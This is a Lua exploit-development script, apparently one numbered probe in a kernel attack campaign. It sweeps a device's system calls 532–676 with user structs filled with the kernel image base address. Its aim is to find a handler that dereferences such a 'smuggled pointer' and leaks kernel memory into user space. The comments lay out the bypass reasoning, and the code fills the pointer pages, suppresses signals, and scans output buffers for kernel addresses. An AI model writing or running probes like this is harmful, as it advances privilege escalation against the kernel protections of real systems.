-- CRASH_CLASS: MODERATE -- every call is one of the numbers that already survived 1342a/1391a; the
-- probe prints the number before each call and stops at the first call that does not return.
-- PROBE 1392a: the smuggled-pointer sweep - a USER struct whose CONTENTS are kernel addresses.
--
-- 1391a proved that no handler accepts a kernel address in a pointer ARGUMENT: the supervisor bit
-- is enforced everywhere (results/phase35_dead_end_reruns/1391a_kernel_arg_sweep_20261109_141210.txt).
-- That check cannot help a handler that copies a struct IN and then uses a field of it as an
-- address, because the copyin source is a legitimate user page and the field is just data. The
-- distinction matters: copyin validates the source range and copyout validates the destination
-- range, but a `memcpy(kernel_buf, struct->ptr, n)` in between is validated by nobody. If any
-- handler has that shape, the struct contents come back out through the handler's own output buffer
-- and the answer lands in user memory.
--
-- So this probe hands every number a user page whose every qword is 0xFFFFFFFFC1000000 - this
-- boot's kernel image base per results/1331a_20261109_141053.txt - and a second page whose every
-- qword is 0x100 so a length-shaped field stays sane. The output buffer is painted 0xA5 and scanned
-- for changed dwords and for kernel-band values (high dword at +4 >= 0xFF800000).
--
-- The dispatchers get the struct in the slot that carries one:
--   532(cmd, 0, out, struct, size)   - the struct is the third pointer
--   601(cmd, struct, struct2)        - both pointer slots
--   649(handle, sel, out, struct)    - arg3 is the size/struct slot
--
-- Kernel addresses travel as strings and are converted with uint64("0x...") at the call site;
-- 0xFFFFFFFFC1000000 is above 2^53 and a Lua number would silently target the wrong page.
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1391a_kernel_arg_sweep_20261109_141210.txt (pointer ARGUMENTS refused)
--   docs/ARG1_CLASSES_14_10.md, docs/ARG23_CLASSES_14_10.md (U/N/K classes, writers)
--   results/kernel_handlers/asm/sys_532_deep.asm (the 0x2F payload slot and its size gate)

print("=== PROBE 1392a: SMUGGLED-POINTER STRUCT SWEEP ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function hex(v) v = v % 4294967296 return string.format("%08X", v) end
local function rd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v % 4294967296 end return nil end
local function UA(v) if type(v) == "string" then return uint64(v) end return uint64(v) end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
local ign = 0
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    local ok, rv = pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
    if ok and N(rv) == 0 then ign = ign + 1 end
end
print(string.format("[0] SIG_IGN installed on %d/10 signals", ign))

-- page of kernel pointers: qword = 0xFFFFFFFFC1000000 everywhere
local KP = memory.alloc(0x1000)
local KPA = N(KP)
for i = 0, 0xFFF, 8 do
    pcall(function() memory.write_dword(KP + i, 0xC1000000) end)
    pcall(function() memory.write_dword(KP + i + 4, 0xFFFFFFFF) end)
end
-- page of small integers: qword = 0x100 everywhere
local SP = memory.alloc(0x1000)
local SPA = N(SP)
for i = 0, 0xFFF, 8 do
    pcall(function() memory.write_dword(SP + i, 0x100) end)
    pcall(function() memory.write_dword(SP + i + 4, 0) end)
end

local OUT = memory.alloc(0x1000)
local OA = N(OUT)
local PAINT = string.rep(string.char(0xA5), 0x1000)
local function paint() pcall(function() memory.write_buffer(OUT, PAINT) end) end

local function scan()
    local n, acc, kp = 0, {}, 0
    for i = 0, 0xFF do
        local v = rd(OA + i * 4)
        if v and v ~= 0xA5A5A5A5 then
            n = n + 1
            if #acc < 6 then acc[#acc + 1] = hex(v) end
        end
    end
    for i = 0, 0x3F8, 8 do
        local hi = rd(OA + i + 4)
        if hi and hi >= 0xFF800000 and hi ~= 0xFFFFFFFF then kp = kp + 1 end
    end
    return n, table.concat(acc, " "), kp
end

local function call(num, a1, a2, a3, a4, a5, a6)
    local ok, rv = pcall(function()
        return mk(num)(UA(a1), UA(a2), UA(a3), UA(a4 or 0), UA(a5 or 0), UA(a6 or 0))
    end)
    if not ok then return -99999, "EXC" end
    return N(rv), es()
end

local SKIP = {[561]=1,[562]=1,[570]=1,[571]=1,[573]=1,[622]=1,[609]=1,[614]=1,[621]=1,
              [631]=1,[650]=1,[651]=1,[668]=1,[673]=1}
local DISPATCH = {[532]=1, [601]=1, [649]=1, [669]=1, [662]=1, [663]=1, [664]=1, [666]=1,
                  [667]=1, [670]=1, [671]=1, [657]=1}

print("")
print("[A] num(struct of kernel pointers, out, 0x800), then the same with 0x100 fields")
local hits = 0
for num = 532, 676 do
    if not SKIP[num] and not DISPATCH[num] then
        paint()
        local rv1, e1 = call(num, KPA, OA, 0x800)
        local n1, f1, k1 = scan()
        paint()
        local rv2, e2 = call(num, SPA, OA, 0x800)
        local n2, f2, k2 = scan()
        local mark = ""
        if k1 > 0 or k2 > 0 then mark = "  ***KERNEL-BAND OUTPUT"; hits = hits + 1 end
        if n1 ~= n2 or rv1 ~= rv2 then mark = mark .. "  (ptr-vs-int differs)" end
        print(string.format("  %d KP=%d/%-8s/%-3d kp=%d  INT=%d/%-8s/%-3d kp=%d  %s %s%s",
            num, rv1, e1, n1, k1, rv2, e2, n2, k2, f1, f2, mark))
        if rv1 == -99999 or rv2 == -99999 then
            print("  [FATAL] a call did not return; stopping phase A")
            break
        end
    end
end

print("")
print("[B] dispatchers with the struct in a non-arg1 slot")
local function p532(cmd, inp, size, tag)
    paint()
    local rv, e = call(532, cmd, 0, OA, inp, size)
    local n, f, kp = scan()
    print(string.format("  532(0x%02X, 0, out, %s, 0x%X) rv=%-8d %-22s changed=%-3d kp=%d %s",
        cmd, tag, size, rv, e, n, kp, f))
    return rv
end
for _, cmd in ipairs({0x18, 0x19, 0x1E, 0x1F, 0x20, 0x2F}) do
    if p532(cmd, KPA, 0x800, "KPTR") == -99999 then print("  [FATAL] stopping"); return end
    if p532(cmd, SPA, 0x800, "0x100") == -99999 then print("  [FATAL] stopping"); return end
end

local function p601(cmd, a1, a2, tag)
    paint()
    local rv, e = call(601, cmd, a1, a2)
    local n, f, kp = scan()
    print(string.format("  601(0x%02X, %s, %s) rv=%-8d %-22s changed=%-3d kp=%d %s",
        cmd, tag, tag, rv, e, n, kp, f))
    return rv
end
for _, cmd in ipairs({0x00, 0x07, 0x09, 0x0B, 0x0D, 0x0E, 0x13, 0x14, 0x19, 0x1A}) do
    if p601(cmd, KPA, KPA, "KPTR") == -99999 then print("  [FATAL] stopping"); return end
end

print("")
print(string.format("[C] %d number(s) returned kernel-band output", hits))
print("=== PROBE 1392a COMPLETE ===")
